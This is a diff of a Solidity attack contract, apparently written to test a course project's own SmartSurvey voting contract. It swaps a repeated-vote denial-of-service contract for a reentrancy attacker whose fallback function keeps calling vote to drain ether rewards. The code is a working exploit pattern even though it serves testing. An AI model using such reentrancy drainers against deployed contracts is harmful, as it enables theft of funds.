@@ -1,22 +1,38 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
-import {SmartSurvey} from "../src/SurveyContract.sol"; 
+import {SmartSurvey} from "../src/SurveyContract.sol";
 
-contract voteDenialofService {
-    // An attack contract about user try to cause a denial of service
-    // by calling the vote function multiple times
-    SmartSurvey public surveyContract;
+contract reentrancyAttacker3 {
+    SmartSurvey public smartSurvey;
+    string public surveyName;
 
-    constructor(SmartSurvey _surveyContract) payable {
-        surveyContract = _surveyContract;
+    constructor(SmartSurvey _smartSurvey, string memory _surveyName) {
+        smartSurvey = _smartSurvey;
+        surveyName = _surveyName;
     }
 
-    function attack() public {
-        surveyContract.registerUser("attacker", 1234); 
-        surveyContract.viewSurvey("Survey 1");
-        for (uint i = 0; i < 100; i++) {
-            surveyContract.vote("Survey 1", 0);
-        }       
+    function attack() external payable {
+        //register the attacker
+        smartSurvey.registerUser("attacker", 1111);
+        
+        //make a survey 
+        string[] memory options = new string[](2); 
+        options[0] = "no";
+        options[1] = "yes";
+        smartSurvey.create_survey{value: 100 ether}("BlockChainClass", "Should I take our course in blockchain?", options, 1000, 2,1111);
+        smartSurvey.vote("BlockChainClass", 0);
+
+        //end it
+        smartSurvey.endByOwner(surveyName);
+    }
+
+    //fallback function tries to keep collecting reward from the bank
+    fallback() external payable {
+        if (address(smartSurvey).balance >= 1 ether) {
+            smartSurvey.viewSurvey(surveyName);
+            smartSurvey.getSurvey(surveyName);
+            smartSurvey.vote(surveyName, 1);
+        }
     }
 }
